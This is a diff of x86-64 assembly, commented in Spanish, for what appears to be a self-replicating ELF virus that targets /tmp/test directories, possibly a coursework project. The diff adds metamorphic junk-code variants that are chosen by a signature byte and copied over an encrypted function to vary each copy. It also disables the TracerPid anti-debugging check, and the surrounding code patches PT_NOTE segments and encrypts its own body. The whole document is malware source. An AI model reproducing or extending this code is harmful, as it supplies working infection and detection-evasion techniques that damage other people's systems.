@@ -131,6 +131,7 @@ section .text
         cmp rbx, rsi
         ret
     __F_crazy__end:
+	F_crazy_len equ $ - __F_crazy
 
     __F_encrypt_block:
         lea r10, [rel __F_data]         ; base función
@@ -207,7 +208,8 @@ section .text
             ; rdi = 65137838234
         .write_signature:
             mov rax, rdi
-            lea rdi, [rel Traza + 49]
+            lea rdi, [rel Traza]
+            add rdi, Traza_len + 1
             mov rsi, rax
             mov rcx, 12
             cld
@@ -215,6 +217,90 @@ section .text
         add rsp, 12
         ret
     __F_set_unique_trace__end:
+
+    __F_crazy0:
+        inc rax
+        dec rax
+        nop
+        inc rbx
+        dec rbx
+        inc rdx
+        dec rdx
+        inc rdx
+        dec rdx
+        nop
+        cmp rbx, rbx
+        jne __F_crazy0
+        mov rax, rax
+        xchg rax, rax
+        nop dword [rax+rax]
+        add rax, 0
+        nop word [rax+rax]
+        lea rax, [rax]
+        sub rax, 0
+        and rax, -1
+        or  rax, 0
+        not rax
+        cmp rbx, rsi
+        not rax
+        ret
+    __F_crazy0__end:
+
+    __F_crazy1:
+        inc rax
+        inc rdx
+        nop
+        dec rax
+        inc rbx
+        dec rbx
+        inc rdx
+        dec rdx
+        dec rdx
+        nop
+        cmp rbx, rbx
+        jne __F_crazy1
+        mov rax, rax
+        xchg rax, rax
+        nop word [rax+rax]
+        nop dword [rax+rax]
+        and rax, -1
+        lea rax, [rax]
+        sub rax, 0
+        or  rax, 0
+        not rax
+        add rax, 0
+        not rax
+        cmp rbx, rsi
+        ret
+    __F_crazy1__end:
+
+    __F_crazy2:
+        inc rax
+        inc rdx
+        nop
+        dec rax
+        inc rbx
+        inc rdx
+        dec rbx
+        xchg rax, rax
+        dec rdx
+        dec rdx
+        nop
+        cmp rbx, rbx
+        jne __F_crazy1
+        mov rax, rax
+        nop word [rax+rax]
+        nop dword [rax+rax]
+        and rax, -1
+        lea rax, [rax]
+        sub rax, 0
+        or  rax, 0
+        not rax
+        add rax, 0
+        not rax
+        cmp rbx, rsi
+        ret
+    __F_crazy2__end:
 
 
 ; ----------------------------------------------------------------------------------------------------------------------
@@ -396,7 +482,6 @@ section .text
         add rbx, rdx
         CALL_ENCRYPT(crazy)
 
-
         jmp .search_trace
 
     .cleanup_and_jump_to_host_1:
@@ -407,8 +492,8 @@ section .text
     .check_tracerPid_value:
         ; Comentar estas 2 líneas para debug con gdb
 
-       cmp byte [rdi], 0x30 ; == "0"
-       jne .cleanup_and_jump_to_host_1
+       ; cmp byte [rdi], 0x30 ; == "0"
+       ; jne .cleanup_and_jump_to_host_1
 
     .close_status_file_and_infect:
         add rsp, 0x1000
@@ -612,12 +697,39 @@ section .text
     .ftruncate:
         CALL_ENCRYPT(ftruncate)
         jnz .munmap
-        
-    .unique_trace:
-        CALL_ENCRYPT(set_unique_trace)
 
     .mod_pt_note:
         CALL_ENCRYPT(mod_pt_note)
+ 
+    .unique_trace:
+        CALL_ENCRYPT(set_unique_trace)
+
+	.mod_functions:
+		; Calculamos signature[0] mod 2
+		xor edx, edx
+		lea rsi, [rel Traza]
+		movzx eax, byte [rsi + Traza_len + 1]
+		mov ebx, 3
+		div ebx
+
+		; multiplicamos dl * F_crazy_len
+		movzx rbx, dl
+		xor edx, edx
+		mov rax, F_crazy_len
+		mul rbx
+
+		; en rax tendemos dl * F_crazy_len
+		; rsi + (dl * F_crazy_len) => direccion de memoria de la funcion a copiar como __F_crazy	
+		; rdi                      => direccion de memoria de la __F_crazy a sobreescribir
+		; memcpy(__F_crazy, __F_crazy0 + rax, F_crazy_len);
+		lea rsi, [rel __F_crazy0]
+		add rsi, rax
+		lea rdi, [rel __F_crazy]
+		mov rcx, F_crazy_len
+		cld
+		rep movsb
+
+    .encrypt_data_block:
         CALL_ENCRYPT(encrypt_block) ; encripta
 
         ; Encriptar data
@@ -699,7 +811,7 @@ section .text
     __F_data:
     tracerPid_str   db      0x54,0x72,0x61,0x63,0x65,0x72,0x50,0x69,0x64,0x3A,0x9  ;"TracerPid:",0x9 ; 11
     status_file     db      0x2F,0x70,0x72,0x6F,0x63,0x2F,0x73,0x65,0x6C,0x66,0x2F,0x73,0x74,0x61,0x74,0x75,0x73,0 ;"/proc/self/status",0 ; 18
-    forbidden_prog  db      "/vim"
+    forbidden_prog  db      "/vim2"
     forbidden_prog_len equ  $ - forbidden_prog - 1
     exe_string      db      0x2F,0x65,0x78,0x65,0 ;"/exe",0 ; 5
     dirs            db      0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0,0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0x32,0,0  ;"/tmp/test",0,"/tmp/test2",0,0
